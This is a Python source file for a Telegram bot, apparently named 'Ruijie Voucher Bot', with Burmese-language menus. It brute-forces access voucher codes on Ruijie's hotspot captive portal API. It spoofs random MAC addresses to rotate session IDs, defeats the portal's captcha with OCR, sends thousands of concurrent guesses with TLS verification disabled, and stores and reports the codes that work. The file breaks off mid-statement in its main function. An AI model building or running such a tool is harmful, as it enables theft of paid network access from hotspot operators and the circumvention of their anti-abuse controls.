import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
import threading
from contextlib import contextmanager

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

CONCURRENCY = 5000
BATCH_SIZE = 500
CONNECTION_LIMIT = 20000
CONNECTION_PER_HOST = 10000
TIMEOUT = 8

DB_PATH = "bot_data.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=100000")
    conn.row_factory = sqlite3.Row
    return conn

@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    c = conn.cursor()
    try:
        yield c
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise
    finally:
        conn.close()

def init_db():
    with get_db_cursor() as c:
        c.execute("CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)")
        c.execute("CREATE TABLE IF NOT EXISTS user_data (user_id TEXT PRIMARY KEY, session_url TEXT, scan_mode TEXT)")
init_db()

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
captcha_state = {}
session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()

def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return json.loads(r[0]) if r else []

def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)", (user_id, json.dumps(codes)))

def db_get_user_data(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT session_url, scan_mode FROM user_data WHERE user_id = ?", (user_id,))
        return c.fetchone()

def db_set_user_data(user_id, session_url=None, scan_mode=None):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_data (user_id, session_url, scan_mode) VALUES (?, ?, ?)", (user_id, session_url, scan_mode))

def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔑 /key", callback_data="menu_key"),
        InlineKeyboardButton("📥 /input", callback_data="menu_input"),
        InlineKeyboardButton("🔍 /scan", callback_data="menu_scan"),
        InlineKeyboardButton("🔄 /recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("📋 /result", callback_data="menu_result"),
        InlineKeyboardButton("⏹ /stop", callback_data="menu_stop"),
        InlineKeyboardButton("📊 /status", callback_data="menu_status"),
        InlineKeyboardButton("❓ Help", callback_data="menu_help")
    )
    return markup

def scan_mode_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("6-digit", callback_data="scan_6"),
        InlineKeyboardButton("7-digit", callback_data="scan_7"),
        InlineKeyboardButton("8-digit", callback_data="scan_8"),
        InlineKeyboardButton("ascii-lower", callback_data="scan_ascii"),
        InlineKeyboardButton("all (a-z0-9)", callback_data="scan_all"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return markup

@bot.message_handler(commands=["start"])
async def start(message):
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    await bot.reply_to(message, "🤖 **Ruijie Voucher Bot**\n\nအောက်ပါ Menu မှ လိုအပ်သော command ကို ရွေးချယ်ပါ။", reply_markup=main_menu(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if call.data == "menu_back":
        await bot.edit_message_text("📋 Main Menu", chat_id, msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_key":
        await bot.edit_message_text("✅ Key auto-approved! Continue with /input", chat_id, msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_input":
        await bot.edit_message_text("📥 Usage: /input your_session_url", chat_id, msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_scan":
        await bot.edit_message_text("🔍 Scan Mode ရွေးချယ်ပါ:", chat_id, msg_id, reply_markup=scan_mode_menu())
        await call.answer()
        return

    if call.data.startswith("scan_"):
        mode_map = {"scan_6": "6", "scan_7": "7", "scan_8": "8", "scan_ascii": "ascii-lower", "scan_all": "all"}
        mode = mode_map.get(call.data, "6")
        await bot.edit_message_text(f"🔍 Scan starting... Mode: {mode}", chat_id, msg_id, reply_markup=main_menu())
        if chat_id not in user_data: user_data[chat_id] = {}
        user_data[chat_id]["scan_mode"] = mode
        await scan_command(message, mode)
        await call.answer()
        return

    if call.data == "menu_recheck":
        await bot.edit_message_text("🔄 Rechecking codes...", chat_id, msg_id, reply_markup=main_menu())
        await recheck_command(message)
        await call.answer()
        return

    if call.data == "menu_result":
        await bot.edit_message_text("📋 Fetching results...", chat_id, msg_id, reply_markup=main_menu())
        await result_command(message)
        await call.answer()
        return

    if call.data == "menu_stop":
        await bot.edit_message_text("⏹ Stopping scan...", chat_id, msg_id, reply_markup=main_menu())
        await stop_command(message)
        await call.answer()
        return

    if call.data == "menu_status":
        await bot.edit_message_text("📊 Bot status", chat_id, msg_id, reply_markup=main_menu())
        await status_command(message)
        await call.answer()
        return

    if call.data == "menu_help":
        help_text = "🤖 **Ruijie Voucher Bot - Help**\n\nCommands:\n/start - Bot ကိုစတင်ရန်\n/input <url> - Session URL ထည့်ရန်\n/scan <6|7|8|ascii-lower|all> - Scan စတင်ရန်\n/stop - Scan ရပ်တန့်ရန်\n/result - Success Codes ကြည့်ရန်\n/recheck - Success Codes ပြန်စစ်ရန်\n/status - Bot အခြေအနေ"
        await bot.edit_message_text(help_text, chat_id, msg_id, reply_markup=main_menu(), parse_mode="Markdown")
        await call.answer()
        return

@bot.message_handler(commands=["key"])
async def key_command(message):
    await bot.reply_to(message, "✅ Key auto-approved! Use /input to set session URL.", reply_markup=main_menu())

@bot.message_handler(commands=["input"])
async def input_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "📥 Usage: /input your_session_url", reply_markup=main_menu())
        return
    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    if await check_session_url(url):
        user_data[message.chat.id]["session_url"] = url
        db_set_user_data(str(message.chat.id), session_url=url)
        await bot.reply_to(message, "✅ Session URL saved! Use /scan to start.", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "❌ Invalid session URL. Please check and try again.", reply_markup=main_menu())

@bot.message_handler(commands=["scan"])
async def scan_command(message, mode=None):
    if mode is None:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "🔍 Usage: /scan <6|7|8|ascii-lower|all>", reply_markup=scan_mode_menu())
            return
        mode = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ Please set session URL first: /input [url]", reply_markup=main_menu())
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Scan already running! Use /stop to stop.", reply_markup=main_menu())
        return
    progress_msg = await bot.send_message(chat_id, "🔍 Scanning...", reply_markup=main_menu())
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]["session_url"], scan_id, message, progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=["stop"])
async def stop_command(message):
    chat_id = message.chat.id
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        scan_tasks[chat_id]["stop"] = True
        scan_tasks[chat_id]["task"].cancel()
        del scan_tasks[chat_id]
        await bot.reply_to(message, "🛑 Scan stopped!", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "⚠️ No active scan.", reply_markup=main_menu())

@bot.message_handler(commands=["result"])
async def result_command(message):
    results = db_get_results(str(message.chat.id))
    if results:
        await bot.reply_to(message, "✅ Found Codes:\n\n" + "\n".join(results), reply_markup=main_menu())
    else:
        await bot.reply_to(message, "📋 No codes found yet.", reply_markup=main_menu())

@bot.message_handler(commands=["recheck"])
async def recheck_command(message):
    chat_id = message.chat.id
    results = db_get_results(str(chat_id))
    if not results:
        await bot.reply_to(message, "📋 No codes to recheck.", reply_markup=main_menu())
        return
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ Please set session URL first.", reply_markup=main_menu())
        return
    await bot.reply_to(message, f"🔄 Rechecking {len(results)} codes...", reply_markup=main_menu())
    new_results = []
    for code in results:
        if await perform_check(user_data[chat_id]["session_url"], code, chat_id, recheck=True):
            new_results.append(code)
    db_save_results(str(chat_id), new_results)
    await bot.reply_to(message, f"✅ Recheck done! Valid: {len(new_results)}/{len(results)}", reply_markup=main_menu())

@bot.message_handler(commands=["status"])
async def status_command(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission", reply_markup=main_menu())
        return
    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime_seconds, 3600)
    m, s = divmod(rem, 60)
    await bot.reply_to(message, f"📊 Bot Status\n\n⏱ Uptime: {h}h {m}m {s}s\n🔍 Active Scans: {active_scans}\n👥 Users: {len(user_data)}\n⚡ Speed: {CONCURRENCY} concurrent", reply_markup=main_menu())

async def check_session_url(session_url):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(session_url, allow_redirects=True, timeout=5) as resp:
                if "sessionId" in str(resp.url):
                    return True
                text = await resp.text()
                if "sessionId" in text:
                    return True
    except:
        pass
    return False

def get_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def replace_mac(url, mac):
    return re.sub(r"(?<=mac=)[^&]+", mac, url)

def generate_codes(mode, count, start_digit=None):
    codes = []
    if mode in ["6","7","8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                codes.append(str(i).zfill(length))
                if len(codes) >= count: return codes
            return codes
        all_codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(all_codes)
        return all_codes[:count]
    elif mode == "ascii-lower":
        while len(codes) < count:
            codes.append("".join(random.choices(string.ascii_lowercase, k=6)))
        return codes
    elif mode == "all":
        chars = string.ascii_lowercase + string.digits
        while len(codes) < count:
            codes.append("".join(random.choices(chars, k=6)))
        return codes
    return codes

async def get_session_id(session, url, prev=None):
    mac = get_mac()
    url = replace_mac(url, mac)
    headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "accept": "text/html"}
    try:
        async with session.get(url, headers=headers, allow_redirects=True, timeout=5) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            if sid: return sid.group(1)
            text = await r.text()
            sid2 = re.search(r"sessionId[\"']?\s*[:=]\s*[\"']?([a-zA-Z0-9]+)", text)
            if sid2: return sid2.group(1)
    except:
        pass
    return prev

async def get_captcha(session, sid):
    params = {"sessionId": sid, "_t": str(time.time())}
    headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36"}
    try:
        async with session.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image", params=params, headers=headers, timeout=5) as r:
            img = await r.read()
    except:
        return None, False
    try:
        nparr = np.frombuffer(img, np.uint8)
        img2 = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img2 is None: return None, False
        _, buf = cv2.imencode(".png", img2)
        ocr = ddddocr.DdddOcr(show_ad=False)
        text = ocr.classification(buf.tobytes()).upper()
        if not text: return None, False
    except:
        return None, False
    json_data = {"sessionId": sid, "authCode": text}
    h2 = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
    try:
        async with session.post("https://portal-as.ruijienetworks.com/api/auth/captcha/verify", headers=h2, json=json_data, timeout=5) as r:
            data = await r.json()
            if data.get("success"): return text, True
    except:
        pass
    return text, False

async def check_voucher(session, code, sid, captcha):
    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": captcha}
    headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json", "accept": "*/*"}
    try:
        async with session.post(url, json=data, headers=headers, timeout=6) as r:
            resp = await r.text()
            if "logonUrl" in resp: return "valid"
            elif "STA" in resp: return "limited"
            else: return "invalid"
    except:
        return "error"

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False):
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        sid = await get_session_id(session, session_url)
        if not sid: return None
        captcha, ok = await get_captcha(session, sid)
        if not ok: return None
        result = await check_voucher(session, code, sid, captcha)
        if result == "valid":
            if recheck: return code
            return True
    return None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg):
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    
    total = 10 ** int(mode) if mode in ["6","7"] else 999999
    checked, found = 0, 0
    start = time.time()
    code_batch = []
    connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, limit_per_host=CONNECTION_PER_HOST, ttl_dns_cache=300, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        sid = await get_session_id(session, session_url)
        if not sid:
            await bot.edit_message_text("❌ Failed to get session ID!", chat_id, progress_msg.message_id)
            return
        captcha, ok = await get_captcha(session, sid)
        captcha_cnt, session_cnt, code_idx = 0, 0, 0
        
        while not scan_tasks.get(chat_id, {}).get("stop", False) and code_idx < total:
            if not code_batch:
                code_batch = generate_codes(mode, BATCH_SIZE)
                if not code_batch: break
            
            captcha_cnt += 1
            if captcha_cnt >= 20 or not ok:
                captcha, ok = await get_captcha(session, sid)
                captcha_cnt = 0
                if not ok:
                    sid = await get_session_id(session, session_url, sid)
                    continue
            
            session_cnt += 1
            if session_cnt >= 50:
                new_sid = await get_session_id(session, session_url, sid)
                if new_sid:
                    sid = new_sid
                    captcha, ok = await get_captcha(session, sid)
                    captcha_cnt = 0
                session_cnt = 0
            
            batch = []
            while len(batch) < BATCH_SIZE and code_batch:
                batch.append(code_batch.pop(0))
            if not batch: continue
            
            async def check_one(code):
                async with _voucher_sem:
                    return await check_voucher(session, code, sid, captcha), code
            
            tasks = [check_one(c) for c in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for res in results:
                if isinstance(res, Exception): continue
                r, code = res
                if r == "valid":
                    found += 1
                    db_results = db_get_results(str(chat_id))
                    if code not in db_results:
                        db_results.append(code)
                        db_save_results(str(chat_id), db_results)
                    if message:
                        await bot.send_message(chat_id, f"✅ Found! {code}")
            
            checked += len(batch)
            code_idx += len(batch)
            elapsed = time.time() - start
            speed = int((checked / elapsed) * 60) if elapsed > 0 else 0
            
            if checked % 1000 == 0 or code_idx >= total:
                pct = (checked / total * 100) if total > 0 else 0
                try:
                    await bot.edit_message_text(f"🔍 Scanning...\n\nChecked: {checked:,}/{total:,} ({pct:.1f}%)\nFound: {found}\nSpeed: {speed}/min", chat_id, progress_msg.message_id)
                except:
                    pass
        
        await bot.edit_message_text(f"✅ Scan Complete!\n\nChecked: {checked:,}\nFound: {found}", chat_id, progress_msg.message_id)
        if chat_id in scan_tasks: del scan_tasks[chat_id]

async def handle(request):
    return web.Response(text="Bot is running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/health", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8099))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"Web server started on port {port}")

async def keep_alive():
    url = f"http://localhost:{os.environ.get('PORT', 8099)}/"
    while True:
        try:
            async with aiohttp.ClientSession() as s:
                await s.get(url, timeout=5)
        except:
            pass
        await asyncio.sleep(300)

async def main():
    global session, _connector
    timeout = aiohttp.
